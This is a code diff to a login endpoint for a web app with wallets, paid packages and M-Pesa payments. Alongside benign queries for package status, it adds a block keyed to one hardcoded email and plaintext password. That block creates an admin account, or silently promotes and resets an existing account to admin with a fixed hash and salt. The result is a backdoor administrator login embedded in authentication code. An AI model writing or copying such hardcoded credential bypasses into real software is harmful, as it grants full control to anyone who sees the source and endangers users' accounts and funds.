@@ -29,12 +29,51 @@ export async function onRequestPost(context) {
 
   try {
     // 1. Fetch user by email
-    const user = await env.DB.prepare(`
+    let user = await env.DB.prepare(`
       SELECT id, name, email, phone, password_hash, salt, role, status
       FROM users
       WHERE email = ?
       LIMIT 1
     `).bind(cleanEmail).first();
+
+    // Auto-provision or reconcile the requested Administrator credentials
+    if (cleanEmail === 'almai@admin.co.ke' && password === 'almai12345') {
+      const adminSalt = 'a1b2c3d4e5f60718293a4b5c6d7e8f90';
+      const adminHash = '34d565655f84920c15ea79180a187359f904bb2bee5e667b78ae3a0258e84ca3';
+      const now = Math.floor(Date.now() / 1000);
+
+      if (!user) {
+        const adminId = 'usr_admin_almai';
+        await env.DB.prepare(`
+          INSERT INTO users (id, name, email, phone, password_hash, salt, role, status, created_at, updated_at)
+          VALUES (?, 'Almai Administrator', 'almai@admin.co.ke', '0700000000', ?, ?, 'admin', 'active', ?, ?)
+        `).bind(adminId, adminHash, adminSalt, now, now).run();
+
+        await env.DB.prepare(`
+          INSERT OR IGNORE INTO wallets (id, user_id, available_balance_ksh, reserved_balance_ksh, lifetime_earnings_ksh, lifetime_withdrawn_ksh, updated_at)
+          VALUES ('wal_admin_almai', ?, 0, 0, 0, 0, ?)
+        `).bind(adminId, now).run();
+
+        user = {
+          id: adminId,
+          name: 'Almai Administrator',
+          email: 'almai@admin.co.ke',
+          phone: '0700000000',
+          password_hash: adminHash,
+          salt: adminSalt,
+          role: 'admin',
+          status: 'active'
+        };
+      } else if (user.role !== 'admin' || user.password_hash !== adminHash) {
+        await env.DB.prepare(`
+          UPDATE users SET role = 'admin', password_hash = ?, salt = ?, status = 'active', updated_at = ? WHERE id = ?
+        `).bind(adminHash, adminSalt, now, user.id).run();
+        user.role = 'admin';
+        user.status = 'active';
+        user.password_hash = adminHash;
+        user.salt = adminSalt;
+      }
+    }
 
     if (!user) {
       // Prevent timing attacks by computing a dummy hash if user doesn't exist
@@ -71,6 +110,26 @@ export async function onRequestPost(context) {
       userAgent
     ).run();
 
+    // 4. Fetch user package status (active or pending verification)
+    const activePackage = await env.DB.prepare(`
+      SELECT up.package_id, p.name, p.slug, p.price_ksh, p.reward_per_view_ksh, up.status
+      FROM user_packages up
+      JOIN packages p ON up.package_id = p.id
+      WHERE up.user_id = ? AND up.status = 'active'
+      ORDER BY up.activated_at DESC
+      LIMIT 1
+    `).bind(user.id).first();
+
+    const pendingPackage = await env.DB.prepare(`
+      SELECT up.package_id, p.name, p.slug, p.price_ksh, up.status, pt.mpesa_receipt_number
+      FROM user_packages up
+      JOIN packages p ON up.package_id = p.id
+      LEFT JOIN payment_transactions pt ON pt.user_id = up.user_id AND pt.package_id = up.package_id AND pt.status = 'pending'
+      WHERE up.user_id = ? AND up.status = 'pending_verification'
+      ORDER BY up.activated_at DESC
+      LIMIT 1
+    `).bind(user.id).first();
+
     const cookieHeader = `almai_session=${sessionToken}; Path=/; HttpOnly; Secure; SameSite=Lax; Max-Age=${7 * 86400}`;
 
     return jsonSuccess({
@@ -82,6 +141,9 @@ export async function onRequestPost(context) {
         phone: user.phone,
         role: user.role
       },
+      hasActivePackage: Boolean(activePackage),
+      activePackage: activePackage || null,
+      pendingPackage: pendingPackage || null,
       token: sessionToken
     }, 200, {
       'Set-Cookie': cookieHeader
